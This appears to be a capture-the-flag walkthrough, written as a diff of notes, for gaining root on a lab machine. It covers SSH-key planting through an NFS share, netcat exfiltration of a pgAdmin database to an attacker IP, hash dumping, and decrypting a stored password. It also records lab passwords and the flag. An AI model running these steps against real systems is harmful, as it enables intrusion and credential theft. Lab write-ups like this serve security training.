@@ -1,0 +1,98 @@
+#10.10.10.127
+--------------
+
+#Getting shell
+--------------------------------
+#found one file 'mbox' inside charlie folder
+#it says that the passwd for root user is same as dba user, so try to find it on server
+
+#now try to get shell using this link
+>>>https://resources.infosecinstitute.com/exploiting-nfs-share/#gref
+
+#now we will create own SSH keys and append the newly created public key into the authorized_key of the victim user. Then log into the remote host with the victim user and own password
+
+#to do this, create own ssh key pair using 'ssh-keygen' command
+ssh-keygen  (enter only key name and leave everything blank)
+> Enter file in which to save the key (/root/.ssh/id_rsa): key_rsa
+
+#now copy the output of 'key_rsa.pub' and append into "mnt/charlie/.ssh/authorized_keys"
+echo <content of key_rsa.pub> >> "mnt/charlie/.ssh/authorized_keys"	(do this as ash user's shell)
+
+#now just login to ssh as charlie user
+ssh -i key_rsa charlie@10.10.10.127		(do this as ash user's shell)
+
+#we know that there is some database files or something related to 'pgadmin4' from port 8081 , so search for that
+find / -name "*.db" 2>/dev/null
+	[OR]
+find / -name "pgadmin4*" 2>/dev/null   
+#found the location of pgadmin4 server files --> /usr/local/pgadmin4/pgadmin4-3.4/
+
+#found file -->  pgadmin4.db
+#download it and examin
+#to download just run this on server
+python3 -m http.server 
+#and now access 10.10.10.127:8000
+	[OR[
+#run this on server
+nc -w 5 10.10.13.186 999 < pgadmin4.db
+#run this on local machine
+nc -l -p 999 > pgadmin4.db
+
+
+#EXAMIN 'pgadmin4.db' FILE
+----------------------------------
+#this is a sqlit database file
+#use 'sqlite3' cmd to examin it
+sqlite3 pgadmin4.db
+>.help
+>.tables
+>.dump user
+#found hashes for bob & charlie
+#charlie's hash
+$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
+#bob's hash
+$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
+
+>.dump server
+#found dba user passwd
+75745555306a6b616d435a446d71464c4f724175506a46784c307a70387a577a495365354d463047592f6c3853696c726d753363617172746a61566a4c516c76464645674553477a
+#it is hex encoded so after hex decoding
+utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
+
+--------------------------------------------------------
+
+#pgadmin is open source and we can check it here
+>>>https://github.com/postgres/pgadmin4
+>>>https://github.com/postgres/pgadmin4/tree/master/web/pgadmin/utils   -->  (crypto.py)
+		[OR]
+#now search on server for the file that encrypted dba passswd 
+#found server_manager.py file --> /usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/server_manager.py
+#found crypto.py file -->  /usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/crypto.py
+#download it and analyse it
+
+#'server_manager.py' is source code and it is using some 'pgadmin.utils.crypto' library to crypt the passwd
+#Crypto.py is a library in pgadmin
+#check crypto.py file , there is decryption function in it
+
+#Encrypted pass is dba ‘s passwd from server table 
+#and key to encrypt/decrypt the passwd, is bob’s hash because according to the mail(mbox), bob was the one who changed the pass 
+
+#now to get the actual passwd call decrypt function and provide dba passwd with key(bob's hash)
+#add these lines into crypto.py file
+*******************************************
+a = decrypt("utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz","$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg")
+print a
+*******************************************
+#now run crypto.py
+python crypto.py
+
+#got decrypted passwd for dba -->  R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+#so root passwd is also same as dba
+su root
+#PASSWD- R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+
+
+#key
+335af7f02878890aea32d64f7ea3a0f8
+
+
